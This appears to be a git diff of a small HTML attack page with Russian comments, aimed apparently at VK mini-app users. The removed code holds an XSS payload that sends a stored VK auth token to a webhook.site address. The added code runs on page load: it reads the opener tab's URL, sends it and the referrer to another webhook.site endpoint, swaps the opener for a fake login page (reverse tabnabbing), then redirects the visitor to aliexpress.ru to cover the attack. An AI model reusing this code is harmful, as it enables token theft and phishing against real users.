@@ -1,26 +1,41 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
-</head>
+<head><title>Loading...</title></head>
 <body>
-    <h1>Нажми для авторизации в игре</h1>
-    <button onclick="exploit()" style="padding: 20px;">ИГРАТЬ</button>
+<script>
+  const webhook = "https://webhook.site/40f8f088-01f8-4127-bb7e-39d5ab0e24c0";
 
-    <script>
-        vkBridge.send('VKWebAppInit');
+  try {
+    if (window.opener) {
+      // 1. Пытаемся украсть URL родителя (самое ценное)
+      let parentUrl = "Access Denied";
+      try {
+        parentUrl = window.opener.location.href;
+      } catch(e) {
+        // Если доступ к href закрыт, пробуем хотя бы узнать домен
+        parentUrl = "Blocked by Cross-Origin Policy";
+      }
 
-        function exploit() {
-            // Мы перенаправляем пользователя на ту же страницу, но пытаемся 
-            // передать код через URL. Это имитация атаки на "доверие".
-            const targetApp = "https://vk.com/app51491054";
-            const payload = "<script>fetch('https://webhook.site/195e32ed-1e8e-40af-bc70-c2aac62a6661?token='+localStorage.getItem('6287487:web_token:login:auth'))<\/script>";
-            
-            // Если мы найдем способ прокинуть этот payload в приложение - это 100% Critical Bug
-            window.open(targetApp + "#" + payload, "_blank");
-            
-            alert("Попытка инъекции выполнена. Если приложение уязвимо, токен уйдет на Webhook.");
-        }
-    </script>
+      // 2. Отправляем данные на вебхук
+      fetch(webhook + "?leak=" + btoa(parentUrl) + "&origin=" + btoa(document.referrer));
+
+      // 3. Трюк "Tabnabbing": если мы не можем прочитать URL, 
+      // мы всё еще можем ПОМЕНЯТЬ его на свой (фейковый логин)
+      try {
+        window.opener.location = "https://webhook.site/40f8f088-01f8-4127-bb7e-39d5ab0e24c0/fake_login_page";
+      } catch(e) {}
+    } else {
+      // Если открыто без opener
+      fetch(webhook + "?error=no_opener&ref=" + btoa(document.referrer));
+    }
+  } catch (err) {
+    fetch(webhook + "?error=" + btoa(err.message));
+  }
+
+  // Через 2 секунды уводим пользователя на легитимный сайт
+  setTimeout(() => {
+    location.href = "https://aliexpress.ru";
+  }, 1500);
+</script>
 </body>
 </html>
